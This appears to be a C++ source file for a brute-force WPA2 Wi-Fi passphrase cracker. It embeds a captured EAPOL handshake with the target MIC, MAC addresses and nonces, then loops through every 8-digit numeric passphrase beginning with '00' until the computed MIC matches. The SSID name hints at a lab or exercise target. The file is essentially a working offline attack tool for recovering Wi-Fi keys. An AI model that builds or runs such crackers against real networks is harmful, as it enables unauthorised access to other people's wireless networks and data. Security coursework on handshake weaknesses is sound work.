#include "attack.h"
#include <iostream>
#include <vector>
#include <string>

using namespace std;

/* g++ -o bruteForce bruteForce.cpp attack.cpp -lcrypto */
int main() {
    string ssid = "DoNotCrack_Bru";

    string packetHex = "88027a019078413a25be588694aae2f2588694aae2f210000000aaaa03000000888e010300970213ca00100000000000000001355242d9265a4672882713910db49efd35252fe100152ae8237995a0a981a325355242d9265a4672882713910db49efd1d180000000000000000000000000000c3e9a16a8056058252415f9349703e5d003857b0ad8747a5288205c7f0aa60a136b58b852818b9800e08faf9990a866a140618a089d81293ed8122e526490a3cde28ef2c8eb04fc132a7";
    string targetMic = "c3e9a16a8056058252415f9349703e5d";
    vector<uint8_t> eapol = changePacketToEapol(packetHex, targetMic);
    
    vector<uint8_t> amac = hexToBytes("588694aae2f2");
    vector<uint8_t> smac = hexToBytes("9078413a25be");
    vector<uint8_t> anonce = hexToBytes("355242d9265a4672882713910db49efd35252fe100152ae8237995a0a981a325");
    vector<uint8_t> snonce = hexToBytes("61e9ff5a73fd2abda23cc03af176ee1dcaa23f6a041d22e0d9f30bbe5164a5c1");
    vector<uint8_t> concMacNonce = concatMacNonce(amac, smac, anonce, snonce);

    const string CHARSET = "0123456789";
    const string FIXED_PREFIX = "00";

    string passphrase(8, '0');
    passphrase.replace(0, 2, FIXED_PREFIX);

    for (char c1 : CHARSET) {
        passphrase[2] = c1;
        for (char c2 : CHARSET) {
            passphrase[3] = c2; {
                for (char c3 : CHARSET) {
                    passphrase[4] = c3;
                    for (char c4 : CHARSET) {
                        passphrase[5] = c4;
                        for (char c5 : CHARSET) {
                            passphrase[6] = c5;
                            for (char c6 : CHARSET) {
                                passphrase[7] = c6;
                                // cout << "Testing: " << passphrase << endl;
                                
                                string mic = myHash(passphrase, ssid, amac, smac, snonce, anonce, concMacNonce, eapol);
                                if (mic == targetMic) {
                                    cout << "Passphrase: " << passphrase << endl;
                                    return 0;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    cout << "Passphrase not found" << endl;
    return 1;
}
